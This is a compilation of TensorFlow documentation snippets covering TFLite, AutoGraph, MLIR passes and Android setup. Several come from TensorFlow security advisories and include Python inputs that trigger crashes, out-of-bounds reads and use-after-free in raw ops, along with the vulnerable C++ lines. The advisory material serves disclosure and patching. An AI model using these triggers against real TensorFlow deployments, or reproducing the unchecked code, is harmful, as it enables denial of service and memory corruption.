TITLE: Documenting C Hexagon Delegate API
DESCRIPTION: Defines the C structure TfLiteHexagonDelegateOptions for configuring the delegate and outlines the key functions for creating, deleting, initializing the DSP connection (with or without path), and tearing down the connection.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/hexagon.md#_snippet_3

LANGUAGE: C
CODE:
```
struct TfLiteHexagonDelegateOptions {
  // This corresponds to the debug level in the Hexagon SDK. 0 (default)
  // means no debug.
  int debug_level;
  // This corresponds to powersave_level in the Hexagon SDK.
  // where 0 (default) means high performance which means more power
  // consumption.
  int powersave_level;
  // If set to true, performance information about the graph will be dumped
  // to Standard output, this includes cpu cycles.
  // WARNING: Experimental and subject to change anytime.
  bool print_graph_profile;
  // If set to true, graph structure will be dumped to Standard output.
  // This is usually beneficial to see what actual nodes executed on
  // the DSP. Combining with 'debug_level' more information will be printed.
  // WARNING: Experimental and subject to change anytime.
  bool print_graph_debug;
};

// Return a delegate that uses Hexagon SDK for ops execution.
// Must outlive the interpreter.
TfLiteDelegate*
TfLiteHexagonDelegateCreate(const TfLiteHexagonDelegateOptions* options);

// Do any needed cleanup and delete 'delegate'.
void TfLiteHexagonDelegateDelete(TfLiteDelegate* delegate);

// Initializes the DSP connection.
// This should be called before doing any usage of the delegate.
// "lib_directory_path": Path to the directory which holds the
// shared libraries for the Hexagon NN libraries on the device.
void TfLiteHexagonInitWithPath(const char* lib_directory_path);

// Same as above method but doesn't accept the path params.
// Assumes the environment setup is already done. Only initialize Hexagon.
Void TfLiteHexagonInit();

// Clean up and switch off the DSP connection.
// This should be called after all processing is done and delegate is deleted.
Void TfLiteHexagonTearDown();
```

----------------------------------------

TITLE: Registering Custom Multiplexer Kernel Builder in C++
DESCRIPTION: Registers the kernel implementation (`MultiplexDenseOp`) for the `Examples1>MultiplexDense` op. It specifies that the kernel runs on the CPU device and applies a type constraint `T` to match the op's attribute. `TF_CALL_ALL_TYPES` expands the registration for various supported TensorFlow data types.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_1/README.md#_snippet_4

LANGUAGE: c++
CODE:
```
#define REGISTER_KERNELS(type)                                  \
  REGISTER_KERNEL_BUILDER(Name("Examples1>MultiplexDense")      \
                              .Device(::tensorflow::DEVICE_CPU) \
                              .TypeConstraint<type>("T"),       \
                          MultiplexDenseOp<type>)

TF_CALL_ALL_TYPES(REGISTER_KERNELS);
#undef REGISTER_KERNELS
```

----------------------------------------

TITLE: Initializing ImageProperties Object (Python)
DESCRIPTION: Initializes the `ImageProperties` object with a buffer and position. This method is likely used internally during object construction or deserialization. Takes the buffer (`buf`) and a position (`pos`) within the buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ImageProperties.md#_snippet_5

LANGUAGE: python
CODE:
```
Init(\n    buf, pos\n)
```

----------------------------------------

TITLE: Initializing SlurmClusterResolver Basic - Python
DESCRIPTION: Demonstrates the basic usage of `SlurmClusterResolver` to automatically detect cluster configuration from the Slurm environment. It then shows how to use the resolver to instantiate a `MultiWorkerMirroredStrategy` for distributed training within a strategy scope.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/distribute/cluster_resolver/README_Slurm.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
cluster_resolver = tf.distribute.cluster_resolver.SlurmClusterResolver()
strategy = tf.distribute.experimental.MultiWorkerMirroredStrategy(cluster_resolver=cluster_resolver)
with strategy.scope(): # Load and compile model and data
```

----------------------------------------

TITLE: Changing Base Model Architecture - Python
DESCRIPTION: Retrieves a different model specification ('bert_qa') to change the underlying base model architecture used for training. This requires subsequent model creation steps using the new specification.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/question_answer.ipynb#_snippet_15

LANGUAGE: python
CODE:
```
spec = model_spec.get('bert_qa')
```

----------------------------------------

TITLE: Importing Packages for NL Classifier Metadata (Python)
DESCRIPTION: Imports the necessary Python packages from the tflite_support library to work with natural language classifier metadata. This includes the specific writer class for NL classifiers (`nl_classifier`), a module for general metadata information structures (`metadata_info`), and utility functions for file operations (`writer_utils`). These imports are the first step in setting up the environment to write metadata for an NL model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata_writer_tutorial.ipynb#_snippet_12

LANGUAGE: Python
CODE:
```
from tflite_support.metadata_writers import nl_classifier
from tflite_support.metadata_writers import metadata_info
from tflite_support.metadata_writers import writer_utils
```

----------------------------------------

TITLE: Generating Vocabulary in AverageWordVecSpec
DESCRIPTION: Creates a vocabulary list from the provided examples, limited by the `num_words` parameter set during initialization. This vocabulary is used for text vectorization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/AverageWordVecSpec.md#_snippet_3

LANGUAGE: python
CODE:
```
gen_vocab(
    examples
)
```

----------------------------------------

TITLE: Install Nightly TFLite Model Maker Python Package Shell
DESCRIPTION: This shell command installs the latest nightly build of the TensorFlow Lite Model Maker library using pip. Nightly builds may contain new features but could be less stable than standard releases.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/index.md#_snippet_2

LANGUAGE: shell
CODE:
```
pip install tflite-model-maker-nightly
```

----------------------------------------

TITLE: Apply round_weights Transform (Bash)
DESCRIPTION: This snippet demonstrates building and executing the `tensorflow/tools/graph_transforms:transform_graph` tool using Bazel. It then runs the tool on an input graph (`tensorflow_inception_graph.pb`) applying the `round_weights` transform with `num_steps=256`. This reduces the precision of floating-point weights, making the output graph file (`optimized_inception_graph.pb`) compress more effectively with gzip without requiring runtime changes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/graph_transforms/README.md#_snippet_4

LANGUAGE: bash
CODE:
```
bazel build tensorflow/tools/graph_transforms:transform_graph
bazel-bin/tensorflow/tools/graph_transforms/transform_graph \
--in_graph=tensorflow_inception_graph.pb \
--out_graph=optimized_inception_graph.pb \
--inputs='Mul' \
--outputs='softmax' \
--transforms='
  strip_unused_nodes(type=float, shape="1,299,299,3")
  fold_constants(ignore_errors=true)
  fold_batch_norms
  fold_old_batch_norms
  round_weights(num_steps=256)'
```

----------------------------------------

TITLE: Defining Logit Comparison Plot Function Python
DESCRIPTION: Defines a helper function using Matplotlib to visualize and compare two sets of logits (e.g., from original and TFLite models). It creates a bar plot and calculates the total absolute difference between the two sets, displaying the difference in the plot title.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/on_device_training/overview.ipynb#_snippet_11

LANGUAGE: python
CODE:
```
#@title
def compare_logits(logits):
  width = 0.35
  offset = width/2
  assert len(logits)==2

  keys = list(logits.keys())
  plt.bar(x = np.arange(len(logits[keys[0]]))-offset,
      height=logits[keys[0]], width=0.35, label=keys[0])
  plt.bar(x = np.arange(len(logits[keys[1]]))+offset,
      height=logits[keys[1]], width=0.35, label=keys[1])
  plt.legend()
  plt.grid(True)
  plt.ylabel('Logit')
  plt.xlabel('ClassID')

  delta = np.sum(np.abs(logits[keys[0]] - logits[keys[1]]))
  plt.title(f"Total difference: {delta:.3g}")

compare_logits({'Original': logits_original, 'Lite': logits_lite})
```

----------------------------------------

TITLE: Demonstrating Nested Lambdas with Identical Args (TF 2.4+) Python
DESCRIPTION: Shows an example (relevant for TF 2.4 and newer) of nested lambda functions using the same argument name (`x`). Due to parsing difficulties, AutoGraph may raise an error as it cannot distinguish the signatures, requiring distinct argument names for nested lambdas.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_51

LANGUAGE: Python
CODE:
```
l = lambda x: lambda x: x + 1
```

----------------------------------------

TITLE: Creating Keras Model in AverageWordVecSpec
DESCRIPTION: Constructs the Keras model instance based on the initialized AverageWordVecSpec configuration. It takes the number of output classes and an optional optimizer name.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/AverageWordVecSpec.md#_snippet_2

LANGUAGE: python
CODE:
```
create_model(
    num_classes, optimizer='rmsprop', with_loss_and_metrics=True
)
```

----------------------------------------

TITLE: Accessing Static Python Dictionary with Dynamic Key Error Python
DESCRIPTION: Illustrates an error when accessing a static Python dictionary (`d`) using a dynamic key (`key` obtained from iteration) inside control flow. This can lead to an "illegal capture" error in graph execution.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_31

LANGUAGE: Python
CODE:
```
d = {'a': tf.constant(3)}
for i in tf.range(10):
  for key in d:
    d[key] += i  # Problem -- accessing `dict` using non-constant key
```

----------------------------------------

TITLE: Getting TFLite Metadata Buffer in Python
DESCRIPTION: Defines the method signature for `get_metadata_buffer`. This method retrieves the raw metadata buffer directly from the TFLite model data. It returns the metadata content as a bytearray.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata/MetadataDisplayer.md#_snippet_2

LANGUAGE: python
CODE:
```
get_metadata_buffer()
```

----------------------------------------

TITLE: Push Evaluation Binary to Android Device - Shell
DESCRIPTION: Transfers the compiled `run_eval` binary from the local Bazel output directory to a temporary directory (`/data/local/tmp`) on the connected Android device using ADB.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/evaluation/tasks/coco_object_detection/README.md#_snippet_2

LANGUAGE: Shell
CODE:
```
adb push bazel-bin/third_party/tensorflow/lite/tools/evaluation/tasks/coco_object_detection/run_eval /data/local/tmp
```

----------------------------------------

TITLE: Comparing C/C++ File to Formatted Version Bash
DESCRIPTION: Demonstrates how to use the `diff` command to compare the original C/C++ file with the temporary file containing the `clang-format`-ted version. This comparison helps identify specific lines that violate the coding style. Requires both the original and formatted files.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/CONTRIBUTING.md#_snippet_2

LANGUAGE: Bash
CODE:
```
diff <my_cc_file> /tmp/my_cc_file.cc
```

----------------------------------------

TITLE: Example 2D Slice operation (C++)
DESCRIPTION: Demonstrates a two-dimensional Slice operation using conceptual C++ syntax. It slices a 2D array 'b', extracting elements within a bounding box defined by start index {2, 1} and limit index {4, 3}, yielding the specified 2x2 sub-array.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_36

LANGUAGE: C++
CODE:
```
let b =
 { {0.0,  1.0,  2.0},
   {3.0,  4.0,  5.0},
   {6.0,  7.0,  8.0},
   {9.0, 10.0, 11.0} }

Slice(b, {2, 1}, {4, 3}) produces:
  { { 7.0,  8.0},
    {10.0, 11.0} }
```

----------------------------------------

TITLE: List Supported Options for label_image Binary
DESCRIPTION: Executes the label_image binary with the '-h' flag via `adb shell` to display a list of supported command-line options and their descriptions. This helps understand the various configurations available for running the demo.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/label_image/README.md#_snippet_11

LANGUAGE: shell
CODE:
```
./label_image -h
```

----------------------------------------

TITLE: Get Mean Values as NumPy Array Python
DESCRIPTION: This method retrieves the entire array of mean values associated with the normalization options. It returns the values as a NumPy array for convenient numerical processing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/NormalizationOptions.md#_snippet_4

LANGUAGE: Python
CODE:
```
MeanAsNumpy()
```

----------------------------------------

TITLE: Initializing tflite_support.task.processor.Mention - Python
DESCRIPTION: This snippet shows the constructor signature for the `Mention` class. It requires a string `value`, a float `score`, and integer `start` and `end` values to create a mention object, representing a single mention result.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/Mention.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.task.processor.Mention(
    value: str, score: float, start: int, end: int
)
```

----------------------------------------

TITLE: Reading Associated File using Java Metadata Extractor
DESCRIPTION: Shows the method signature in Java's Metadata Extractor library used to obtain an `InputStream` for a specified associated file embedded within the TFLite model metadata. Requires the file name as a parameter.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata.md#_snippet_15

LANGUAGE: java
CODE:
```
public InputStream getAssociatedFile(String fileName);
```

----------------------------------------

TITLE: Defining opt-einsum Dependency
DESCRIPTION: Specifies the exact version (3.3.0) for the 'opt-einsum' package and includes multiple SHA256 hashes. This entry ensures that the optimization library for einsum operations is installed at the required version and validated against the provided hash values.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/requirements_lock_3_12.txt#_snippet_11

LANGUAGE: Python Requirements
CODE:
```
opt-einsum==3.3.0 \
    --hash=sha256:2455e59e3947d3c275477df7f5205b30635e266fe6dc300e3d9f9646bfcea147 \
    --hash=sha256:59f6475f77bbc37dcf7cd748519c0ec60722e91e63ca114e68821c0c54a46549
```

----------------------------------------

TITLE: Input Example: PartitionedCall Island (TPU V1 Inlining)
DESCRIPTION: This MLIR snippet shows a module with a function containing a `tf_executor.island wraps "tf.PartitionedCall"` that references a function in a nested module. This represents the state after outlining and is the input for the `-tf-executor-tpu-v1-island-inlining` pass.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_19

LANGUAGE: MLIR
CODE:
```
module {
  func @foo(%arg0: tensor<f32>) -> tensor<f32> {
    %0 = tf_executor.graph {
      %outputs, %control = tf_executor.island wraps "tf.PartitionedCall"(%arg0) {f = @_tpu_v1_compat_outlined::@bar} : (tensor<f32>) -> tensor<f32>
      tf_executor.fetch %outputs : tensor<f32>
    }
    return %0 : tensor<f32>
  }
  module @_tpu_v1_compat_outlined {
    func nested @bar(%arg0: tensor<f32>) -> tensor<f32> {
      %0 = "tf.opA"(%arg0) : (tensor<f32>) -> tensor<f32>
      return %0 : tensor<f32>
    }
  }
}
```

----------------------------------------

TITLE: Indexing Output in SparseFillEmptyRowsGrad - C++
DESCRIPTION: This C++ code snippet shows a line from the `SparseFillEmptyRowsGrad` kernel implementation in TensorFlow. It attempts to assign a value from `grad_values` to `d_values` using an index calculated by `reverse_index_map`. The vulnerability (CVE-2020-15195) occurs here because the calculated index `reverse_index_map(i)` can exceed the bounds of `grad_values`, resulting in a heap buffer overflow. This line is part of the core logic that needed patching.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-021.md#_snippet_0

LANGUAGE: C++
CODE:
```
d_values(i) = grad_values(reverse_index_map(i));
```

----------------------------------------

TITLE: Calling tf.raw_ops.Conv3D with Zero-Shaped Tensors (Example 1)
DESCRIPTION: This Python snippet calls the `Conv3D` raw operation in TensorFlow with input and filter tensors that have zero dimensions. It is provided as an example within a security advisory, potentially demonstrating inputs that could lead to unexpected behavior or issues.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-005.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

input_tensor = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)
filter_tensor = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)

tf.raw_ops.Conv3D(input=input_tensor, filter=filter_tensor, strides=[1, 56, 56, 56, 1], padding='VALID', data_format='NDHWC', dilations=[1, 1, 1, 23, 1])
```

----------------------------------------

TITLE: Setting ImageAnalysis Analyzer and Buffer - TensorFlow Lite - Kotlin
DESCRIPTION: Connects the configured ImageAnalysis object to a background executor thread (cameraExecutor) and provides a lambda function that will be called with each new image frame. This function lazily initializes a Bitmap buffer using the image dimensions on the first frame and then calls the detectObjects method to process the image.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/quickstart.md#_snippet_10

LANGUAGE: Kotlin
CODE:
```
        .also {
        it.setAnalyzer(cameraExecutor) { image ->
            if (!::bitmapBuffer.isInitialized) {
                bitmapBuffer = Bitmap.createBitmap(
                    image.width,
                    image.height,
                    Bitmap.Config.ARGB_8888
                )
            }
            detectObjects(image)
        }
    }
```

----------------------------------------

TITLE: Creating IndexToStringTable (int64->string) from File - Python
DESCRIPTION: Illustrates creating a tf.lookup.index_to_string_table_from_tensor from a vocabulary read from a file, mapping indices (int64) to strings. It reads words from '/tmp/vocab.file', creates the table with a default word for unknown indices, defines a placeholder for int64 input, and sets up the lookup operation with table initialization dependency.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/kernels/hashtable.md#_snippet_5

LANGUAGE: Python
CODE:
```
with open('/tmp/vocab.file', 'r') as f:
  words = f.read().splitlines()

UNK_WORD = "unknown"
vocab = tf.constant(words)
vocab_table = tf.lookup.index_to_string_table_from_tensor(vocab, default_value=UNK_WORD)

input_tensor = tf.compat.v1.placeholder(tf.int64, shape=[1])

with tf.control_dependencies([tf.initializers.tables_initializer()]):
  out_tensor = vocab_table.lookup(input_tensor)
```

----------------------------------------

TITLE: Configuring Android Gradle Dependencies for TFLite Audio
DESCRIPTION: This Gradle snippet configures the Android module's build.gradle file to include the TensorFlow Lite Task Library for audio classification and specifies that .tflite files should not be compressed during APK packaging. Required dependencies include 'org.tensorflow:tensorflow-lite-task-audio' and optionally the GPU delegate plugin.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/audio_classifier.md#_snippet_0

LANGUAGE: Gradle
CODE:
```
android {
    // Other settings

    // Specify that the tflite file should not be compressed when building the APK package.
    aaptOptions {
        noCompress "tflite"
    }
}

dependencies {
    // Other dependencies

    // Import the Audio Task Library dependency (NNAPI is included)
    implementation 'org.tensorflow:tensorflow-lite-task-audio:0.4.4'
    // Import the GPU delegate plugin Library for GPU inference
    implementation 'org.tensorflow:tensorflow-lite-gpu-delegate-plugin:0.4.4'
}
```

----------------------------------------

TITLE: Selecting TensorFlow Lite Model File Name (Kotlin)
DESCRIPTION: This snippet demonstrates how to dynamically choose the appropriate .tflite model file name using a `when` statement based on a predefined `currentModel` variable. It ensures the correct model asset is referenced for initialization. Requires `currentModel` to be set and corresponding .tflite files in the `src/main/assets` directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/object_detection.md#_snippet_4

LANGUAGE: Kotlin
CODE:
```
val modelName =
  when (currentModel) {
    MODEL_MOBILENETV1 -> "mobilenetv1.tflite"
    MODEL_EFFICIENTDETV0 -> "efficientdet-lite0.tflite"
    MODEL_EFFICIENTDETV1 -> "efficientdet-lite1.tflite"
    MODEL_EFFICIENTDETV2 -> "efficientdet-lite2.tflite"
    else -> "mobilenetv1.tflite"
  }
```

----------------------------------------

TITLE: Calculating Slice Size in TFLite Split Operator (C++)
DESCRIPTION: This C++ snippet from the TFLite `Split` kernel shows the vulnerable code. It first checks if the input size is evenly divisible by the number of splits and then calculates the size of each output slice by dividing `input_size` by `num_splits`. The vulnerability arises because `num_splits` is not checked for being zero before the division.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-087.md#_snippet_0

LANGUAGE: C++
CODE:
```
TF_LITE_ENSURE_MSG(context, input_size % num_splits == 0, "Not an even split");
const int slice_size = input_size / num_splits;
```

----------------------------------------

TITLE: Handling Dynamic Shapes with Input Signature Python
DESCRIPTION: Shows how to make code compatible with both static and dynamic shapes by explicitly giving a tensor dynamic shape using `input_signature=(tf.TensorSpec(shape=(None,)))` in `tf.function`. When the shape is dynamic (`None`), static shape checks are skipped, allowing code like `x[4]` inside a `tf.cond` without a tracing error. Requires TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_37

LANGUAGE: Python
CODE:
```
@tf.function(input_signature=(tf.TensorSpec(shape=(None,))))
def f(x):  # x now has dynamic shape
  if tf.shape(x)[0] >= 3:  # Builds a tf.cond
    val = x[4]  # Okay, bounds checks are skipped when the shape is dynamic
  else:
    val = some_default_value
```

----------------------------------------

TITLE: Triggering TensorFlow AvgPoolGrad FPE with Python
DESCRIPTION: This Python code snippet demonstrates how to trigger the Floating Point Exception (FPE) vulnerability in tf.raw_ops.AvgPoolGrad. It calls the operation with ksize and strides parameters containing zero values, which can lead to an FPE, especially when the function is compiled using XLA (jit_compile=True).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2023-019.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
import numpy as np

@tf.function(jit_compile=True)
def test():
   y = tf.raw_ops.AvgPoolGrad(orig_input_shape=[1,0,0,0], grad=[[[[0.39117979]]]], ksize=[1,0,0,0], strides=[1,0,0,0], padding="SAME", data_format="NCHW")
   return y

print(test())
```

----------------------------------------

TITLE: Starting Input Tensor Groups Vector in TFLite Metadata (Python)
DESCRIPTION: This function is part of the FlatBuffers builder pattern used in the TFLite metadata schema Python bindings. It is called to initiate the construction of a vector (array) that will hold multiple `InputTensorGroup` objects within a `SubGraphMetadata` definition. It requires a `builder` object (likely a FlatBuffers `Builder`) and the `numElems` representing the expected number of elements in the vector.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadataStartInputTensorGroupsVector.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.SubGraphMetadataStartInputTensorGroupsVector(
    builder, numElems
)
```

----------------------------------------

TITLE: Performing Static Analysis: Control Flow Graph Building
DESCRIPTION: Illustrates building a Control Flow Graph (CFG) for a Python function using `pyct.cfg.build`. It first parses a function `f` with an if statement and resolves qualified names. It then calls `cfg.build` on the resolved AST to generate the CFG representation, which can be accessed per node.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/pyct_tutorial.ipynb#_snippet_6

LANGUAGE: python
CODE:
```
from tensorflow.python.autograph.pyct import cfg


def f(a):
  if a > 0:
    return a
  b = -a

node, ctx = get_node_and_ctx(f)

node = qual_names.resolve(node)
cfgs = cfg.build(node)
cfgs[node]
```

----------------------------------------

TITLE: Triggering RaggedGather OOB - TensorFlow Python
DESCRIPTION: This Python code snippet demonstrates a heap out-of-bounds read vulnerability in `tf.raw_ops.RaggedGather`. It calls the raw operation with specific `params_nested_splits`, `params_dense_values`, and `indices` arrays that do not form a valid ragged tensor structure, leading to an OOB read or a `CHECK` failure in debug builds. This highlights the vulnerability before it was patched.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-116.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.RaggedGather(
  params_nested_splits = [0,0,0],
  params_dense_values = [1,1],
  indices = [0,0,9,0,0],
  OUTPUT_RAGGED_RANK=0)
```

----------------------------------------

TITLE: Reproducing AvgPoolOp Vulnerability (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger the `AvgPoolOp` vulnerability (TFSA-2022-091) by providing a very large value (1e20) for the `ksize` parameter's spatial dimension. Executing this code on an affected TensorFlow version will likely result in a `CHECK` failure and program termination.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-091.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
import numpy as np

value = np.ones([1, 1, 1, 1])
ksize = [1, 1e20, 1, 1]
strides = [1, 1, 1, 1]
padding = 'SAME'
data_format = 'NHWC'

tf.raw_ops.AvgPool(value=value, ksize=ksize, strides=strides, padding=padding, data_format=data_format)
```

----------------------------------------

TITLE: Profiling Time by Python Code Lines (tfprof)
DESCRIPTION: This tfprof command profiles model execution time, aggregating it by the Python source code line that created the operations. It displays results up to a depth of 10, selects the total execution time (`micros`), and orders the results by `micros`, filtering to show names matching `seq2seq_attention.*`. Requires `--graph_path`, `--op_log_path`, and `--run_meta_path` when run from the command line.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/profiler/g3doc/profile_time.md#_snippet_0

LANGUAGE: tfprof
CODE:
```
tfprof> code -show_name_regexes seq2seq_attention.* -max_depth 10 -select micros -order_by micros
```

----------------------------------------

TITLE: Calling CollectiveReduceV2 with invalid params (Python)
DESCRIPTION: This Python snippet demonstrates how to call the `tf.raw_ops.CollectiveReduceV2` operation with invalid negative values for size and key parameters. This specific invocation is provided as an example that can trigger the use-after-free and memory leak vulnerability described in the security advisory, showcasing the problematic input format.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-177.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

tf.raw_ops.CollectiveReduceV2(
  input=[],
  group_size=[-10, -10, -10],
  group_key=[-10, -10],
  instance_key=[-10],
  ordering_token=[],
  merge_op='Mul',
  final_op='Div')
```

----------------------------------------

TITLE: Install Dependencies for TFLite Model Maker Python
DESCRIPTION: This code snippet installs the required packages for using TensorFlow Lite Model Maker and related tools like pycocotools and opencv-python-headless within a Python environment (likely a notebook). It first installs a system library (`libportaudio2`) and then uses pip to install Python packages, including a specific version of TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/object_detection.ipynb#_snippet_1

LANGUAGE: Python
CODE:
```
!sudo apt -y install libportaudio2
!pip install -q --use-deprecated=legacy-resolver tflite-model-maker
!pip install -q pycocotools
!pip install -q opencv-python-headless==4.1.2.30
!pip uninstall -y tensorflow && pip install -q tensorflow==2.8.0
```

----------------------------------------

TITLE: Hoisting tf.Shape from tf_device.replicate in MLIR
DESCRIPTION: This example demonstrates the `-tf-replicate-invariant-op-hoisting` pass's ability to hoist a `tf.Shape` operation outside a `tf_device.replicate` region if its input is a replicated parameter, assuming the shape is invariant across replicas. The original `tf.Shape` operating on the replicated value is replaced by one operating on a single replica's value. This requires the `tf.Shape` input to be a direct replicated parameter.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_37

LANGUAGE: MLIR
CODE:
```
tf_device.replicate([%0, %1] as %ri: tensor<*xi32>) {n = 2 : i32} {
  %2 = "tf.Shape"(%ri) : (tensor<*xi32>) -> tensor<?xi32>
  tf_device.return
}
```

LANGUAGE: MLIR
CODE:
```
tf_device.replicate([%0, %1] as %ri: tensor<*xi32>) {n = 2 : i32} {
  %2 = "tf.Shape"(%0) : (tensor<*xi32>) -> tensor<?xi32>
  tf_device.return
}
```

----------------------------------------

TITLE: Vulnerable SparseBinCount Loop - TensorFlow C++
DESCRIPTION: This C++ snippet shows the vulnerable loop inside the `SparseBinCount` implementation. It iterates through the sparse tensor elements and directly uses `values(i)` as the bin index (`bin`) without checking if it is non-negative or within the bounds of the output buffer (`out`). A negative or excessively large value in `values(i)` results in an out-of-bounds write.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-171.md#_snippet_1

LANGUAGE: c++
CODE:
```
for (int64_t i = 0; i < indices_mat.dimension(0); ++i) {
  const int64_t batch = indices_mat(i, 0);
  const Tidx bin = values(i);
  ...
  out(batch, bin) = ...;
}
```

----------------------------------------

TITLE: Preprocessing Dataset with YamNetSpec [Python]
DESCRIPTION: Applies necessary preprocessing steps to a given dataset (`ds`) before it can be used for training or validation with the model. It includes options for handling training-specific preprocessing and caching the results.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/YamNetSpec.md#_snippet_5

LANGUAGE: python
CODE:
```
preprocess_ds(
    ds, is_training=False, cache_fn=None
)
```

----------------------------------------

TITLE: Example Build TFLite Python (armhf, Py3.7) - Shell
DESCRIPTION: Example command demonstrating how to use the Makefile helper to build the TensorFlow Lite Python package within a Docker container, specifically targeting the `armhf` architecture and Python 3.7. This requires Docker and the TensorFlow source code. It's suitable for devices like Raspberry Pi 3/4.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake_pip.md#_snippet_2

LANGUAGE: sh
CODE:
```
make -C tensorflow/lite/tools/pip_package docker-build \
  TENSORFLOW_TARGET=armhf PYTHON_VERSION=3.7
```

----------------------------------------

TITLE: Configuring Eigen Features (C++)
DESCRIPTION: Defines preprocessor macros used to configure the Eigen library based on the build environment. `EIGEN_USE_THREADS` enables multi-threading support, and `EIGEN_USE_GPU` enables GPU support when compiling with CUDA or ROCm.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_2/README.md#_snippet_4

LANGUAGE: cpp
CODE:
```
#define EIGEN_USE_THREADS

#if GOOGLE_CUDA || TENSORFLOW_USE_ROCM
#define EIGEN_USE_GPU
#endif
```

----------------------------------------

TITLE: Downloading NL Classifier Example Files (Shell)
DESCRIPTION: Uses shell commands (executed via `!curl`, typical in environments like Colab) to download the required example files for the natural language classifier metadata task. It fetches the TFLite model file (`movie_review.tflite`), the label file (`movie_review_labels.txt`), and the vocabulary file (`movie_review_vocab.txt`) from their respective GitHub and Google Storage locations. These files serve as input for the metadata population process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata_writer_tutorial.ipynb#_snippet_13

LANGUAGE: Shell
CODE:
```
!curl -L https://github.com/tensorflow/tflite-support/raw/master/tensorflow_lite_support/metadata/python/tests/testdata/nl_classifier/movie_review.tflite -o movie_review.tflite
